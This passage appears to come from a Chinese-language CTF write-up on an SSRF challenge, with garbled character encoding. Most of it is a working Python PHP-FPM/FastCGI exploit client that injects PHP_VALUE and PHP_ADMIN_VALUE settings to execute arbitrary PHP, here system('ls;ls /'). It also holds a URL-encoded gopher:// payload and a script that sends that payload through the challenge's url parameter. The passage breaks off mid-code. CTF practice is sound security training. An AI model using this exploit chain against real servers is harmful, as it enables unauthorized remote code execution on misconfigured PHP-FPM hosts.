<span class="token operator">=</span> <span class="token number">8</span>    <span class="token comment"># request state</span>    FCGI_STATE_SEND <span class="token operator">=</span> <span class="token number">1</span>    FCGI_STATE_ERROR <span class="token operator">=</span> <span class="token number">2</span>    FCGI_STATE_SUCCESS <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> keepalive<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host        self<span class="token punctuation">.</span>port <span class="token operator">=</span> port        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout        <span class="token keyword">if</span> keepalive<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>requests <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__connect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># if self.keepalive:</span>        <span class="token comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>        <span class="token comment"># else:</span>        <span class="token comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>sock <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">__encodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fcgi_type<span class="token punctuation">,</span> content<span class="token punctuation">,</span> requestid<span class="token punctuation">)</span><span class="token punctuation">:</span>        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>        buf <span class="token operator">=</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_VERSION<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>fcgi_type<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>requestid <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>requestid <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>length <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> content        <span class="token keyword">return</span> buf    <span class="token keyword">def</span> <span class="token function">__encodeNameValueParams</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        nLen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>        vLen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>        record <span class="token operator">=</span> <span class="token string">b''</span>        <span class="token keyword">if</span> nLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>nLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>nLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> vLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>vLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>vLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> record <span class="token operator">+</span> name <span class="token operator">+</span> value    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIHeader</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> header    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>__FCGI_HEADER_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> header<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIHeader<span class="token punctuation">(</span>header<span class="token punctuation">)</span>            record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b''</span>                        <span class="token keyword">if</span> <span class="token string">'contentLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                contentLength <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span>contentLength<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'paddingLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                skiped <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> record    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nameValuePairs<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> post<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>__connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'connect failure! please check your fasctcgi-server !!'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        requestId <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> <span class="token string">b""</span>        beginFCGIRecordContent <span class="token operator">=</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_ROLE_RESPONDER<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>keepalive<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_BEGIN<span class="token punctuation">,</span>                                              beginFCGIRecordContent<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        paramsRecord <span class="token operator">=</span> <span class="token string">b''</span>        <span class="token keyword">if</span> nameValuePairs<span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> nameValuePairs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                name <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>name<span class="token punctuation">)</span>                value <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>value<span class="token punctuation">)</span>                paramsRecord <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeNameValueParams<span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>        <span class="token keyword">if</span> paramsRecord<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> paramsRecord<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        <span class="token keyword">if</span> post<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> force_bytes<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SEND        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b''</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__waitForResponse<span class="token punctuation">(</span>requestId<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__waitForResponse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token string">b''</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            buf <span class="token operator">=</span> self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            data <span class="token operator">+=</span> buf        data <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIRecord<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> response<span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDOUT \                    <span class="token keyword">or</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_ERROR                <span class="token keyword">if</span> requestId <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> response<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SUCCESS<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Php-fpm code execution vulnerability client.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Target host, such as 127.0.0.1'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'What php code your want to execute'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'&lt;?php phpinfo(); exit; ?>'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'FastCGI port'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    client <span class="token operator">=</span> FastCGIClient<span class="token punctuation">(</span>args<span class="token punctuation">.</span>host<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    documentRoot <span class="token operator">=</span> <span class="token string">"/"</span>    uri <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token builtin">file</span>    content <span class="token operator">=</span> args<span class="token punctuation">.</span>code    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> documentRoot <span class="token operator">+</span> uri<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> documentRoot<span class="token punctuation">,</span>        <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'9985'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_TYPE'</span><span class="token punctuation">:</span> <span class="token string">'application/text'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">"%d"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'PHP_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'auto_prepend_file = php://input'</span><span class="token punctuation">,</span>        <span class="token string">'PHP_ADMIN_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'allow_url_include = On'</span>    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>request<span class="token punctuation">(</span>params<span class="token punctuation">,</span> content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>force_text<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ‰¾flagï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">python .\fpm.py &quot;172.22.73.110&quot; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot; -c &quot;&lt;?php system(&#39;ls;ls &#x2F;&#39;); exit; ?&gt;&quot; -p 2333</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707200642461.png" alt loading="lazy"></p><pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A9000&#x2F;_%2501%2501%25E7%25F4%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%25E7%25F4%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI&#x2F;1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250B%2517SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250D%2501DOCUMENT_ROOT&#x2F;%250F%250ESERVER_SOFTWAREphp&#x2F;fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250C%2510CONTENT_TYPEapplication&#x2F;text%250E%2502CONTENT_LENGTH33%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%25E7%25F4%2500%2500%2500%2500%2501%2505%25E7%25F4%2500%2521%2500%2500%253C%253Fphp%2520system%2528%2527ls%253Bls%2520&#x2F;%2527%2529%253B%2520exit%253B%2520%253F%253E%2501%2505%25E7%25F4%2500%2500%2500%2500</code></pre><p>wslä¸Šç›‘å¬2333ç«¯å£ç”¨æ¥æ¥æ”¶flagï¼Œå¹¶å°†ç»“æœä¿å­˜åˆ°<code>fcg_exp.txt</code>æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707201353035.png" alt loading="lazy"></p><p>ç„¶åå†å°†æ–‡ä»¶è¯»å–å‡ºæ¥å¾—åˆ°æœ‰æ•ˆçš„payloadç›´æ¥æ‰“</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token punctuation">,</span> unquote<span class="token punctuation">,</span> urlencode<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge-3c0ef6982bf49126.sandbox.ctfhub.com:10800/?url="</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'fcg_exp.txt'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> quote<span class="token punctuation">(</span><span class="token string">"gopher://127.0.0.1:9000/_"</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%0A"</span><span class="token punctuation">,</span><span class="token 